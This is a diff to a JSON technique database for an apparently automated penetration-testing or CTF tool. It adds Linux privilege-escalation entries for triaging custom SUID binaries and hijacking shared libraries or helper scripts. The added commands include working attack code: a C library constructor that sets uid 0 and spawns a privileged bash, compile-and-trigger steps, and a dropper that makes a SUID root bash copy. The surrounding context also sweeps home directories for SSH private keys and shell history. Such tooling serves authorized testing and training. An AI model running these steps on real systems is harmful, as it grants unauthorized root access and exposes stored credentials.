@@ -774,7 +774,8 @@
         "privesc.suid_candidate",
         "privesc.suid",
         "privesc.cron",
-        "privesc.cron_writable"
+        "privesc.cron_writable",
+        "privesc.path_hijack_candidate"
       ],
       "produces": [
         "access.admin"
@@ -1120,7 +1121,8 @@
       "requires_any": [
         "privesc.cron_writable",
         "privesc.cron",
-        "privesc.sudo_rights"
+        "privesc.sudo_rights",
+        "privesc.library_or_script_hijack"
       ],
       "produces": [
         "access.admin"
@@ -1990,6 +1992,149 @@
           "tool": "sh",
           "run": "find /root /home -maxdepth 3 \\( -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \".bash_history\" \\) -exec head -n 50 {} + 2>/dev/null",
           "note": "Sweep /root and /home for SSH private keys and command history containing lateral movement credentials.",
+          "locus": "onhost"
+        }
+      ]
+    },
+    {
+      "id": "linux-custom-binary-triage",
+      "title": "Inspect Non-Standard Privileged Binary (strings / ldd / readelf / ltrace)",
+      "phase": "escalate",
+      "locus": "F",
+      "transition": "privesc_act",
+      "hypothesis": "When SUID, sudo, capabilities, cron, or systemd enumeration reveals a non-standard binary outside the stock OS baseline (for example under /opt, /usr/local/bin, /var, or /home) that is not in GTFOBins, it is almost always custom code with a binary-level privilege-escalation flaw. Inspect its permissions, dynamic library paths (RPATH/RUNPATH and missing .so files), embedded strings (bare command names or helper scripts), and library/system calls before guessing.",
+      "tool": "strings",
+      "tools": [
+        "sh",
+        "strings",
+        "ltrace"
+      ],
+      "os": [
+        "linux"
+      ],
+      "sequence": true,
+      "requires_all": [
+        "foothold.linux",
+        "privesc.custom_binary"
+      ],
+      "requires_any": [],
+      "produces": [
+        "privesc.path_hijack_candidate",
+        "privesc.library_or_script_hijack"
+      ],
+      "settled_by": [
+        "privesc.path_hijack_candidate",
+        "privesc.library_or_script_hijack"
+      ],
+      "obsoleted_by": [
+        "privesc.path_hijack_candidate",
+        "privesc.library_or_script_hijack",
+        "access.admin",
+        "objective.root_flag"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 76,
+      "proves": "whether the custom privileged binary invokes a bare command via PATH, loads a shared object from a writable or missing RPATH/RUNPATH, or executes a writable helper script",
+      "does_not_prove": "root execution until the discovered PATH, shared-object, or helper-script hijack is planted and triggered",
+      "report": {
+        "finding": "Custom Privileged Binary Exposed to Dynamic Call or Library Inspection",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "file {{custom_bin|/opt/app/helper}}; ls -la {{custom_bin|/opt/app/helper}}; ldd {{custom_bin|/opt/app/helper}}",
+          "note": "Check file type, SUID/owner bits, and linked shared libraries (`not found` or `/opt/...` / `/tmp/...` library paths are direct `.so` hijack leads).",
+          "locus": "onhost"
+        },
+        {
+          "tool": "sh",
+          "run": "readelf -d {{custom_bin|/opt/app/helper}} 2>/dev/null | grep -iE 'rpath|runpath|needed'",
+          "note": "Inspect ELF dynamic tags for custom RPATH/RUNPATH directories (such as `/tmp`, `$ORIGIN`, or a writable `/opt` folder) searched before system libraries.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "strings",
+          "run": "strings -n 4 {{custom_bin|/opt/app/helper}} | grep -E '(/opt/|/var/|/home/|/tmp/|\\.sh|\\.py|\\.so|tar |ps |service |curl |wget |cp |chmod )'",
+          "note": "Extract printable strings and look for bare command invocations (no leading `/`, hijackable via PATH) or hardcoded helper scripts and config files.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "ltrace",
+          "run": "ltrace {{custom_bin|/opt/app/helper}} 2>&1 | head -n 40",
+          "note": "Trace dynamic library calls (`system()`, `popen()`, `execvp()`, `dlopen()`, `fopen()`) at runtime. Use `strace -e trace=execve,openat -f` if `ltrace` is absent.",
+          "locus": "onhost"
+        }
+      ]
+    },
+    {
+      "id": "linux-shared-library-hijack",
+      "title": "Shared Object (.so RPATH / dlopen) or Helper Script Hijack",
+      "phase": "escalate",
+      "locus": "F",
+      "transition": "privesc_act",
+      "hypothesis": "When `ldd`, `readelf -d`, `strace`, or `strings` on a custom SUID/sudo/cron binary reveals a missing shared library (`not found`), a writable `RPATH`/`RUNPATH` directory, a `dlopen()` call to a writable path, or an external helper script under `/opt`, `/var`, or `/tmp` that you can write or create, planting a shared library constructor (`__attribute__((constructor))`) or payload script runs your code as root.",
+      "tool": "gcc",
+      "tools": [
+        "gcc",
+        "sh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "sequence": true,
+      "requires_all": [
+        "foothold.linux",
+        "privesc.library_or_script_hijack"
+      ],
+      "requires_any": [],
+      "produces": [
+        "access.admin"
+      ],
+      "settled_by": [
+        "access.admin"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 74,
+      "proves": "root execution by loading a controlled `.so` constructor or writable helper script into the privileged binary",
+      "does_not_prove": "escalation if the target directory is root-owned and non-writable or if `AT_SECURE` strips untrusted paths",
+      "report": {
+        "finding": "Local Privilege Escalation via Shared Library or Helper Script Hijack",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat << 'EOF' > /tmp/hijack.c\n#include \"stdio.h\"\n#include \"stdlib.h\"\n#include \"unistd.h\"\nstatic void __attribute__((constructor)) init(void) {\n    setuid(0); setgid(0);\n    unsetenv(\"LD_PRELOAD\");\n    system(\"/bin/bash -p\");\n}\nEOF",
+          "note": "Write a minimal C shared-library constructor that claims uid/gid 0 and spawns a privileged shell as soon as the binary loads the library.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc -shared -fPIC /tmp/hijack.c -o /path/to/hijack_target.so && {{custom_bin|/opt/app/helper}}",
+          "note": "Compile the shared object into the missing or writable RPATH/dlopen path revealed during binary triage, then invoke the privileged binary.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "sh",
+          "run": "echo -e '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /path/to/helper.sh && chmod +x /path/to/helper.sh && {{custom_bin|/opt/app/helper}} && /tmp/rootbash -p",
+          "note": "Helper-script variant: if the binary invokes a writable or missing `.sh` script by path, write a SUID-bash dropper there and trigger the binary (or wait for its cron/timer).",
           "locus": "onhost"
         }
       ]
